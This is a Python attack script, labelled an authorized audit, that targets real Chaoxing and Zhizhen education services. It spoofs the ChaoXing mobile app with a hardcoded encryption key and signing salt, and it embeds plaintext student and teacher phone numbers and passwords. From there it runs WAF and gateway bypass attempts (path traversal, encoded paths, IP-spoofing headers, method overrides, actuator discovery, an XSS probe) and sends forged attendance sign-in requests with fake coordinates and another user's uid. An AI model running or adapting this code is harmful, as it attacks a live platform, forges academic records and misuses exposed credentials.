#!/usr/bin/env python3
"""
Deep Security Testing Script - Authorized Audit
Targets: fe.chaoxing.com, mh.chaoxing.com, contestyd.chaoxing.com, ss.zhizhen.com
Focus: Sign-in API behavior, WAF bypass, gateway routing, auth investigation
"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ============================================================
# Core login infrastructure (provided)
# ============================================================
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

# ============================================================
# Test context
# ============================================================
STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
ACTIVE_ID = "5000163891319"

# ============================================================
# Helpers
# ============================================================
def safe_req(session, method, url, **kwargs):
    """Make a request safely, return dict with status/headers/body"""
    try:
        resp = session.request(method, url, timeout=20, allow_redirects=False, verify=False, **kwargs)
        body = ""
        try:
            body = resp.text[:2000]
        except:
            body = "<binary>"
        return {
            "status": resp.status_code,
            "headers": dict(resp.headers),
            "body": body,
            "redirect": resp.headers.get("Location", "")
        }
    except Exception as e:
        return {"status": -1, "error": str(e), "body": ""}

def fmt_result(r):
    """Format a result for printing"""
    if r.get("error"):
        return f"ERROR: {r['error']}"
    lines = [f"HTTP {r['status']}"]
    if r.get("redirect"):
        lines.append(f"  Redirect: {r['redirect']}")
    # Interesting headers
    for h in ["Server", "X-Cache", "Access-Control-Allow-Credentials", "Access-Control-Allow-Origin",
              "Content-Type", "X-ReqId", "X-Tengine-Error"]:
        v = r.get("headers", {}).get(h)
        if v:
            lines.append(f"  {h}: {v}")
    if r.get("body"):
        lines.append(f"  Body: {r['body'][:300]}")
    return "\n".join(lines)

# ============================================================
# TEST 1: fe.chaoxing.com WAF Bypass
# ============================================================
def test_fe_waf_bypass(session):
    print("\n" + "="*80)
    print("TEST 1: fe.chaoxing.com WAF Bypass Tests")
    print("="*80)

    base = "https://fe.chaoxing.com"
    sign_paths = [
        "/pptSign/updateSignStatus",
        "/pptSign/updateSignStatusByUidsV2",
        "/pptSign/refeashSignList4Json2",
        "/newsign/updateSignStatus",
    ]

    # --- 1a: Path encoding bypass ---
    print("\n--- 1a: Path Encoding Bypass ---")
    encoding_tests = [
        ("URL-encoded slash", "/pptSign%2FupdateSignStatus"),
        ("Double URL-encoded slash", "/pptSign%252FupdateSignStatus"),
        ("Unicode fullwidth slash", "/pptSign%ef%bc%8fupdateSignStatus"),
        ("Semicolon injection", "/pptSign/;updateSignStatus"),
        ("Dot segment", "/pptSign/./updateSignStatus"),
        ("Double slash", "/pptSign//updateSignStatus"),
        ("Triple slash", "///pptSign/updateSignStatus"),
        ("Path with %00", "/pptSign%00/updateSignStatus"),
        ("Backslash", "/pptSign\\updateSignStatus"),
        ("Tab in path", "/pptSign%09/updateSignStatus"),
        ("Space in path", "/pptSign%20/updateSignStatus"),
        ("Path with ..", "/pptSign/../pptSign/updateSignStatus"),
    ]
    for label, path in encoding_tests:
        url = base + path
        r = safe_req(session, "GET", url)
        print(f"\n[{label}] {url}")
        print(fmt_result(r))

    # --- 1b: Header manipulation ---
    print("\n--- 1b: Header Manipulation Bypass ---")
    target_path = "/pptSign/updateSignStatus"
    header_tests = [
        ("X-Forwarded-For: 127.0.0.1", {"X-Forwarded-For": "127.0.0.1"}),
        ("X-Original-URL", {"X-Original-URL": "/pptSign/updateSignStatus"}),
        ("X-Rewrite-URL", {"X-Rewrite-URL": "/pptSign/updateSignStatus"}),
        ("X-Forwarded-Host: mooc1-api", {"X-Forwarded-Host": "mooc1-api.chaoxing.com"}),
        ("Referer: mooc1-api", {"Referer": "https://mooc1-api.chaoxing.com/"}),
        ("Origin: mooc1-api", {"Origin": "https://mooc1-api.chaoxing.com"}),
        ("X-Real-IP: 127.0.0.1", {"X-Real-IP": "127.0.0.1"}),
        ("X-Client-IP: 127.0.0.1", {"X-Client-IP": "127.0.0.1"}),
        ("X-Forwarded-For: 10.0.0.1", {"X-Forwarded-For": "10.0.0.1"}),
        ("True-Client-IP: 127.0.0.1", {"True-Client-IP": "127.0.0.1"}),
        ("PC User-Agent", {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}),
        ("Empty UA", {"User-Agent": ""}),
        ("X-WAF-Bypass: true", {"X-WAF-Bypass": "true"}),
        ("All internal headers combined", {
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Original-URL": "/pptSign/updateSignStatus",
            "Referer": "https://mooc1-api.chaoxing.com/",
            "Origin": "https://mooc1-api.chaoxing.com",
        }),
    ]
    for label, extra_headers in header_tests:
        url = base + target_path
        r = safe_req(session, "GET", url, headers=extra_headers)
        print(f"\n[{label}]")
        print(fmt_result(r))

    # --- 1c: HTTP method override ---
    print("\n--- 1c: HTTP Method Override ---")
    method_tests = [
        ("POST + X-HTTP-Method-Override: GET", "POST", {"X-HTTP-Method-Override": "GET"}),
        ("POST + X-Method-Override: GET", "POST", {"X-Method-Override": "GET"}),
        ("PUT method", "PUT", {}),
        ("PATCH method", "PATCH", {}),
        ("OPTIONS method", "OPTIONS", {}),
        ("HEAD method", "HEAD", {}),
        ("DELETE method", "DELETE", {}),
        ("TRACE method", "TRACE", {}),
    ]
    for label, method, extra_headers in method_tests:
        url = base + target_path
        r = safe_req(session, method, url, headers=extra_headers)
        print(f"\n[{label}]")
        print(fmt_result(r))

    # --- 1d: Content-Type variations (POST) ---
    print("\n--- 1d: Content-Type Variations (POST) ---")
    ct_tests = [
        ("application/json", "application/json", json.dumps({"activeId": ACTIVE_ID})),
        ("multipart/form-data", "multipart/form-data; boundary=----WebKitFormBoundary", "------WebKitFormBoundary\r\n\r\n------WebKitFormBoundary--"),
        ("text/xml", "text/xml", "<?xml version=\"1.0\"?><root/>"),
        ("application/x-www-form-urlencoded", "application/x-www-form-urlencoded", f"activeId={ACTIVE_ID}&courseId={COURSE_ID}&classId={CLASS_ID}"),
    ]
    for label, ct, body in ct_tests:
        url = base + target_path
        r = safe_req(session, "POST", url, headers={"Content-Type": ct}, data=body)
        print(f"\n[{label}]")
        print(fmt_result(r))

    # --- 1e: POST with sign-in params ---
    print("\n--- 1e: POST with sign-in parameters ---")
    sign_params = {
        "activeId": ACTIVE_ID,
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "latitude": "-1",
        "longitude": "-1",
        "appType": "0",
    }
    for path in ["/pptSign/updateSignStatus", "/newsign/updateSignStatus"]:
        url = base + path
        r = safe_req(session, "POST", url, data=sign_params)
        print(f"\n[POST {path} with params]")
        print(fmt_result(r))

    # --- 1f: Test other interesting paths ---
    print("\n--- 1f: Other Interesting Paths ---")
    other_paths = [
        "/",
        "/favicon.ico",
        "/robots.txt",
        "/actuator",
        "/actuator/health",
        "/swagger-ui.html",
        "/api",
        "/v2/apis/sign/signIn",
        "/widget/sign/pcTeaSignController/updateSignStatus2",
        "/pptSign/stuSignajax",
    ]
    for path in other_paths:
        url = base + path
        r = safe_req(session, "GET", url)
        print(f"\n[GET {path}]")
        print(fmt_result(r))


# ============================================================
# TEST 2: mh.chaoxing.com Gateway Tests
# ============================================================
def test_mh_gateway(session):
    print("\n" + "="*80)
    print("TEST 2: mh.chaoxing.com Gateway Tests")
    print("="*80)

    base = "https://mh.chaoxing.com"

    # --- 2a: Test with /entry/ prefix ---
    print("\n--- 2a: /entry/ Prefix Routing ---")
    entry_paths = [
        "/entry/pptSign/updateSignStatus",
        "/entry/pptSign/updateSignStatusByUidsV2",
        "/entry/pptSign/refeashSignList4Json2",
        "/entry/newsign/updateSignStatus",
        "/entry/v2/apis/sign/signIn",
        "/entry/widget/sign/pcTeaSignController/updateSignStatus2",
        "/entry/pptSign/stuSignajax",
        "/entry/pptSign/getSignDetail",
        "/entry/pptSign/preSignStuList4Json",
    ]
    for path in entry_paths:
        url = base + path
        r = safe_req(session, "GET", url)
        print(f"\n[GET {path}]")
        print(fmt_result(r))

    # --- 2b: POST with /entry/ prefix and sign-in params ---
    print("\n--- 2b: POST /entry/ with sign-in params ---")
    sign_params = {
        "activeId": ACTIVE_ID,
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "latitude": "-1",
        "longitude": "-1",
        "appType": "0",
    }
    entry_post_paths = [
        "/entry/pptSign/updateSignStatus",
        "/entry/newsign/updateSignStatus",
        "/entry/v2/apis/sign/signIn",
        "/entry/pptSign/stuSignajax",
    ]
    for path in entry_post_paths:
        url = base + path
        r = safe_req(session, "POST", url, data=sign_params)
        print(f"\n[POST {path} with params]")
        print(fmt_result(r))

    # --- 2c: Gateway routing bypass ---
    print("\n--- 2c: Gateway Routing Bypass ---")
    bypass_paths = [
        # Direct path without /entry/
        "/pptSign/updateSignStatus",
        "/newsign/updateSignStatus",
        "/v2/apis/sign/signIn",
        # Path traversal
        "/entry/../pptSign/updateSignStatus",
        "/entry/..;/pptSign/updateSignStatus",
        "/entry/%2e%2e/pptSign/updateSignStatus",
        "/entry/..%252f/pptSign/updateSignStatus",
        # Different prefixes
        "/api/pptSign/updateSignStatus",
        "/v1/pptSign/updateSignStatus",
        "/v2/pptSign/updateSignStatus",
        "/gateway/pptSign/updateSignStatus",
        "/route/pptSign/updateSignStatus",
        "/proxy/pptSign/updateSignStatus",
        "/service/pptSign/updateSignStatus",
        # Spring Boot actuator
        "/entry/actuator",
        "/entry/actuator/health",
        "/entry/actuator/env",
        "/entry/actuator/routes",
        "/actuator",
        "/actuator/health",
        "/actuator/gateway/routes",
    ]
    for path in bypass_paths:
        url = base + path
        r = safe_req(session, "GET", url)
        print(f"\n[GET {path}]")
        print(fmt_result(r))

    # --- 2d: Test with different auth headers ---
    print("\n--- 2d: Auth Header Tests ---")
    auth_tests = [
        ("X-Forwarded-For: 127.0.0.1", {"X-Forwarded-For": "127.0.0.1"}),
        ("X-Real-IP: 127.0.0.1", {"X-Real-IP": "127.0.0.1"}),
        ("Referer: chaoxing", {"Referer": "https://mooc1-api.chaoxing.com/"}),
        ("Authorization Bearer test", {"Authorization": "Bearer test_token"}),
        ("X-Auth-Token test", {"X-Auth-Token": "test_token"}),
    ]
    for label, extra_headers in auth_tests:
        url = base + "/entry/pptSign/updateSignStatus"
        r = safe_req(session, "GET", url, headers=extra_headers)
        print(f"\n[{label}]")
        print(fmt_result(r))

    # --- 2e: Spring Boot error page info disclosure ---
    print("\n--- 2e: Spring Boot Error/Info Disclosure ---")
    error_paths = [
        "/entry/error",
        "/entry/%s%s%s%s",
        "/entry/;jsessionid=test",
        "/entry/pptSign/..;/updateSignStatus",
        "/entry/pptSign/updateSignStatus;jsessionid=test",
        "/entry/pptSign/updateSignStatus?a=<script>alert(1)</script>",
        "/entry/pptSign/updateSignStatus#fragment",
    ]
    for path in error_paths:
        url = base + path
        r = safe_req(session, "GET", url)
        print(f"\n[GET {path}]")
        print(fmt_result(r))

    # --- 2f: Gateway route discovery ---
    print("\n--- 2f: Gateway Route Discovery ---")
    route_paths = [
        "/entry/actuator/gateway/routes",
        "/entry/actuator/gateway/globalfilters",
        "/entry/actuator/gateway/routefilters",
        "/actuator/gateway/routes",
        "/actuator/gateway/globalfilters",
    ]
    for path in route_paths:
        url = base + path
        r = safe_req(session, "GET", url)
        print(f"\n[GET {path}]")
        print(fmt_result(r))


# ============================================================
# TEST 3: contestyd.chaoxing.com Service Error Investigation
# ============================================================
def test_contestyd(session, teacher_session):
    print("\n" + "="*80)
    print("TEST 3: contestyd.chaoxing.com Service Error Investigation")
    print("="*80)

    base = "https://contestyd.chaoxing.com"

    # --- 3a: Test all sign-in paths ---
    print("\n--- 3a: All Sign-in Paths (Student Session) ---")
    sign_paths = [
        "/v2/apis/sign/signIn",
        "/pptSign/updateSignStatus",
        "/pptSign/updateSignStatusByUidsV2",
        "/pptSign/refeashSignList4Json2",
        "/pptSign/stuSignajax",
        "/pptSign/getSignDetail",
        "/pptSign/preSignStuList4Json",
        "/newsign/updateSignStatus",
        "/newsign/getSignDetail",
        "/widget/sign/pcTeaSignController/updateSignStatus2",
        "/widget/sign/pcTeaSignController/getSignDetail2",
    ]
    for path in sign_paths:
        url = base + path
        r = safe_req(session, "GET", url)
        print(f"\n[GET {path}]")
        print(fmt_result(r))

    # --- 3b: POST with sign-in parameters ---
    print("\n--- 3b: POST Sign-in with Parameters (Student) ---")
    sign_params = {
        "activeId": ACTIVE_ID,
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "latitude": "-1",
        "longitude": "-1",
        "appType": "0",
    }
    sign_params_v2 = {
        "activeId": ACTIVE_ID,
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "uid": "431407443",
        "latitude": "-1",
        "longitude": "-1",
    }
    for path in ["/v2/apis/sign/signIn", "/pptSign/updateSignStatus", "/newsign/updateSignStatus",
                 "/pptSign/stuSignajax", "/pptSign/updateSignStatusByUidsV2"]:
        url = base + path
        r = safe_req(session, "POST", url, data=sign_params)
        print(f"\n[POST {path} with sign_params]")
        print(fmt_result(r))

    # v2 API with JSON
    url = base + "/v2/apis/sign/signIn"
    r = safe_req(session, "POST", url, json=sign_params_v2,
                 headers={"Content-Type": "application/json"})
    print(f"\n[POST /v2/apis/sign/signIn with JSON body]")
    print(fmt_result(r))

    # --- 3c: Teacher session tests ---
    print("\n--- 3c: Teacher Session Tests ---")
    teacher_sign_params = {
        "activeId": ACTIVE_ID,
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "latitude": "-1",
        "longitude": "-1",
    }
    for path in ["/v2/apis/sign/signIn", "/pptSign/updateSignStatus",
                 "/pptSign/updateSignStatusByUidsV2", "/pptSign/refeashSignList4Json2",
                 "/newsign/updateSignStatus", "/widget/sign/pcTeaSignController/updateSignStatus2"]:
        url = base + path
        r = safe_req(teacher_session, "POST", url, data=teacher_sign_params)
        print(f"\n[Teacher POST {path}]")
        print(fmt_result(r))

    # --- 3d: CORS investigation ---
    print("\n--- 3d: CORS Investigation ---")
    cors_origins = [
        "https://mooc1-api.chaoxing.com",
        "https://chaoxing.com",
        "https://evil.com",
        "null",
    ]
    for origin in cors_origins:
        url = base + "/v2/apis/sign/signIn"
        r = safe_req(session, "OPTIONS", url,
                     headers={"Origin": origin, "Access-Control-Request-Method": "POST"})
        print(f"\n[OPTIONS /v2/apis/sign/signIn Origin={origin}]")
        print(fmt_result(r))

    # --- 3e: Different parameter combinations ---
    print("\n--- 3e: Parameter Variation Tests ---")
    param_variations = [
        ("Missing activeId", {"courseId": COURSE_ID, "classId": CLASS_ID}),
        ("Missing courseId", {"activeId": ACTIVE_ID, "classId": CLASS_ID}),
        ("Empty activeId", {"activeId": "", "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("Invalid activeId", {"activeId": "0", "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("With enc param", {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID, "enc": "0"}),
        ("With GPS coords", {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID,
                              "latitude": "39.9042", "longitude": "116.4074", "address": "Beijing"}),
        ("With clientIp", {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID, "clientIp": ""}),
    ]
    for label, params in param_variations:
        url = base + "/v2/apis/sign/signIn"
        r = safe_req(session, "POST", url, data=params)
        print(f"\n[{label}]")
        print(fmt_result(r))

    # --- 3f: Other interesting paths ---
    print("\n--- 3f: Other Interesting Paths ---")
    other_paths = [
        "/",
        "/v2/apis/",
        "/v2/",
        "/v2/apis/sign/",
        "/actuator",
        "/actuator/health",
        "/swagger-ui.html",
        "/api-docs",
        "/v2/api-docs",
        "/favicon.ico",
        "/robots.txt",
    ]
    for path in other_paths:
        url = base + path
        r = safe_req(session, "GET", url)
        print(f"\n[GET {path}]")
        print(fmt_result(r))


# ============================================================
# TEST 4: ss.zhizhen.com Auth Investigation
# ============================================================
def test_ss_zhizhen(session):
    print("\n" + "="*80)
    print("TEST 4: ss.zhizhen.com Auth Investigation")
    print("="*80)

    base = "https://ss.zhizhen.com"

    # --- 4a: Test Zhizhen auth flow ---
    print("\n--- 4a: Zhizhen Auth Flow ---")

    # Try login.zhizhen.com
    print("\n[*] Testing login.zhizhen.com...")
    r = safe_req(session, "GET", "https://login.zhizhen.com/findlogin.jsp")
    print(f"\n[GET https://login.zhizhen.com/findlogin.jsp]")
    print(fmt_result(r))

    r = safe_req(session, "GET", "https://login.zhizhen.com/")
    print(f"\n[GET https://login.zhizhen.com/]")
    print(fmt_result(r))

    # Try SSO token from special.chaoxing.com
    print("\n[*] Testing special.chaoxing.com token endpoint...")
    r = safe_req(session, "GET", "https://special.chaoxing.com/user/token/getToken")
    print(f"\n[GET https://special.chaoxing.com/user/token/getToken]")
    print(fmt_result(r))

    r = safe_req(session, "GET", "https://special.chaoxing.com/user/token/getToken?target=zhizhen")
    print(f"\n[GET .../getToken?target=zhizhen]")
    print(fmt_result(r))

    # --- 4b: Test API behavior without auth ---
    print("\n--- 4b: API Behavior Without Auth ---")
    api_paths = [
        "/pptSign/updateSignStatus",
        "/pptSign/updateSignStatusByUidsV2",
        "/pptSign/refeashSignList4Json2",
        "/pptSign/stuSignajax",
        "/pptSign/getSignDetail",
        "/newsign/updateSignStatus",
        "/v2/apis/sign/signIn",
        "/widget/sign/pcTeaSignController/updateSignStatus2",
    ]
    for path in api_paths:
        url = base + path
        r = safe_req(session, "GET", url)
        print(f"\n[GET {path}]")
        print(fmt_result(r))

    # --- 4c: POST with ChaoXing cookies ---
    print("\n--- 4c: POST with ChaoXing Cookies ---")
    sign_params = {
        "activeId": ACTIVE_ID,
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "latitude": "-1",
        "longitude": "-1",
        "appType": "0",
    }
    for path in ["/pptSign/updateSignStatus", "/v2/apis/sign/signIn", "/newsign/updateSignStatus"]:
        url = base + path
        r = safe_req(session, "POST", url, data=sign_params)
        print(f"\n[POST {path} with ChaoXing cookies]")
        print(fmt_result(r))

    # --- 4d: Try with Zhizhen-specific headers ---
    print("\n--- 4d: Zhizhen-Specific Headers ---")
    zhizhen_headers = [
        ("X-Zhizhen-Token: test", {"X-Zhizhen-Token": "test_token_123"}),
        ("Authorization: Bearer test", {"Authorization": "Bearer test_token_123"}),
        ("X-Auth-Token: test", {"X-Auth-Token": "test_token_123"}),
        ("Referer: zhizhen.com", {"Referer": "https://www.zhizhen.com/"}),
        ("Origin: zhizhen.com", {"Origin": "https://www.zhizhen.com"}),
    ]
    for label, extra_headers in zhizhen_headers:
        url = base + "/pptSign/updateSignStatus"
        r = safe_req(session, "GET", url, headers=extra_headers)
        print(f"\n[{label}]")
        print(fmt_result(r))

    # --- 4e: Check for weaker auth endpoints ---
    print("\n--- 4e: Weaker Auth Endpoints ---")
    weak_paths = [
        "/",
        "/favicon.ico",
        "/robots.txt",
        "/actuator",
        "/actuator/health",
        "/swagger-ui.html",
        "/v2/api-docs",
        "/api-docs",
        "/health",
        "/info",
        "/pptSign/",
        "/newsign/",
        "/v2/",
        "/v2/apis/",
        "/v2/apis/sign/",
    ]
    for path in weak_paths:
        url = base + path
        r = safe_req(session, "GET", url)
        print(f"\n[GET {path}]")
        print(fmt_result(r))

    # --- 4f: Try Zhizhen SSO login flow ---
    print("\n--- 4f: Zhizhen SSO Login Flow ---")
    sso_urls = [
        "https://login.zhizhen.com/findlogin.jsp",
        "https://login.zhizhen.com/cas/login",
        "https://login.zhizhen.com/oauth/authorize",
        "https://ss.zhizhen.com/login",
        "https://ss.zhizhen.com/sso/login",
        "https://ss.zhizhen.com/auth/login",
    ]
    for url in sso_urls:
        r = safe_req(session, "GET", url)
        print(f"\n[GET {url}]")
        print(fmt_result(r))

    # --- 4g: Try using ChaoXing UID as Zhizhen auth ---
    print("\n--- 4g: UID-based Auth Attempts ---")
    uid = ""
    for c in session.cookies:
        if c.name in ("UID", "_uid"):
            uid = c.value
            break

    if uid:
        # Try passing UID in different ways
        uid_tests = [
            ("X-UID header", {"X-UID": uid}),
            ("X-User-Id header", {"X-User-Id": uid}),
            ("uid query param", {}),
        ]
        for label, extra in uid_tests:
            url = base + "/pptSign/updateSignStatus"
            if "query" in label:
                url += f"?uid={uid}"
            r = safe_req(session, "GET", url, headers=extra)
            print(f"\n[{label} uid={uid}]")
            print(fmt_result(r))


# ============================================================
# TEST 5: Cross-domain cookie/token reuse
# ============================================================
def test_cross_domain(student_session, teacher_session):
    print("\n" + "="*80)
    print("TEST 5: Cross-Domain Cookie/Token Reuse")
    print("="*80)

    # --- 5a: Use mooc1-api cookies on other domains ---
    print("\n--- 5a: Cookie Reuse Across Domains ---")
    domains = [
        "https://fe.chaoxing.com",
        "https://mh.chaoxing.com",
        "https://contestyd.chaoxing.com",
        "https://ss.zhizhen.com",
    ]
    for domain in domains:
        url = domain + "/pptSign/updateSignStatus"
        r = safe_req(student_session, "POST", url, data={
            "activeId": ACTIVE_ID,
            "courseId": COURSE_ID,
            "classId": CLASS_ID,
            "latitude": "-1",
            "longitude": "-1",
        })
        print(f"\n[Student POST {url}]")
        print(fmt_result(r))

    # --- 5b: Check if any domain returns user info ---
    print("\n--- 5b: User Info Endpoints ---")
    info_paths = [
        "/mooc-ans/mycourse/backclazzdata?view=json&m=0",
        "/mooc-ans/ans/moocuser/getUserInfo",
        "/mooc-ans/api/user/info",
        "/api/user/info",
        "/user/info",
        "/me",
    ]
    for domain in ["https://contestyd.chaoxing.com", "https://mh.chaoxing.com"]:
        for path in info_paths:
            url = domain + path
            r = safe_req(student_session, "GET", url)
            if r["status"] != -1 and r["status"] != 404:
                print(f"\n[GET {url}]")
                print(fmt_result(r))


# ============================================================
# MAIN
# ============================================================
def main():
    print("="*80)
    print("Deep Security Testing - Authorized Audit")
    print("Targets: fe.chaoxing.com, mh.chaoxing.com, contestyd.chaoxing.com, ss.zhizhen.com")
    print("="*80)

    # Login
    print("\n[*] Logging in as student...")
    student_session, student_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"    Student PUID: {student_puid}")

    print("[*] Logging in as teacher...")
    teacher_session, teacher_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"    Teacher PUID: {teacher_puid}")

    if not student_puid and not teacher_puid:
        print("[!] Both logins failed, attempting tests with unauthenticated sessions...")

    # Run all tests
    test_fe_waf_bypass(student_session)
    test_mh_gateway(student_session)
    test_contestyd(student_session, teacher_session)
    test_ss_zhizhen(student_session)
    test_cross_domain(student_session, teacher_session)

    print("\n" + "="*80)
    print("ALL TESTS COMPLETE")
    print("="*80)


if __name__ == "__main__":
    main()
